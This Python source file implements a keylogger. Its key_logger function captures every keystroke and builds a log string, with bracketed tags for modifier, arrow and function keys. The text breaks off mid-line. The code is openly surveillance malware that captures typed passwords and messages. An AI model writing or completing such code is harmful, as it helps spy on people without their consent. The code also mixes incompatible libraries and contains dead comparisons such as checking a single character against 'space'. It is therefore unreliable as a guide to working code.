import keyboard
import win32api

def key_logger():
    log = ""

    def on_press(key):
        nonlocal log
        try:
            current_key = str(key.char)
            if current_key.isalnum() or current_key == " ":
                log += current_key
            elif current_key == "space":
                log += " "
            elif current_key == "backspace":
                log = log[:-1]
            elif current_key == "enter":
                log += "\n"
            elif current_key == "tab":
                log += "\t"
            elif current_key == "shift":
                log += "[SHIFT]"
            elif current_key == "ctrl":
                log += "[CTRL]"
            elif current_key == "alt":
                log += "[ALT]"
            elif current_key == "esc":
                log += "[ESC]"
            elif current_key == "caps lock":
                log += "[CAPS LOCK]"
            elif current_key == "num lock":
                log += "[NUM LOCK]"
            elif current_key == "scroll lock":
                log += "[SCROLL LOCK]"
            elif current_key == "page up":
                log += "[PAGE UP]"
            elif current_key == "page down":
                log += "[PAGE DOWN]"
            elif current_key == "home":
                log += "[HOME]"
            elif current_key == "end":
                log += "[END]"
            elif current_key == "left arrow":
                log += "[LEFT ARROW]"
            elif current_key == "right arrow":
                log += "[RIGHT ARROW]"
            elif current_key == "up arrow":
                log += "[UP ARROW]"
            elif current_key == "down arrow":
                log += "[DOWN ARROW]"
            elif current_key == "f1":
                log += "[F1]"
            elif current_key == "f2":
                log += "[F2]"
            elif current_key == "f3":
                log += "[F3]"
            elif current_key == "f4":
                log += "[F4]"
            elif current_key == "f5":
                log += "[F5]"
            elif current_key == "f6":
                log += "[F6]"
            elif current_key == "f7":
                log += "[F7]"
            elif current_key == "f8":
                log += "[F8]"
            elif current_key == "f9":
                log += "[F9]"
            elif current_key == "f10":
                log += "[F10]"
            elif current_key == "f11":
                log += "[F11]"
            elif current_key == "f12":
                log += "[F12]"
        except AttributeError:
            if key == win32api.VK_SHIFT:
                log += "[SHIFT]"
            elif key == win32api.VK_CONTROL:
                log += "[CTRL]"
            elif key == win32api.VK_MENU:
                log += "[ALT]"
            elif key == win32api.VK_ESCAPE:
                log += "[ESC]"
            elif key == win32api.VK_CAPITAL:
                log += "[CAPS LOCK]"
            elif key == win32api.VK_NUMLOCK:
                log += "[NUM LOCK]"
            elif key == win32api.VK_SCROLL:
                log += "[
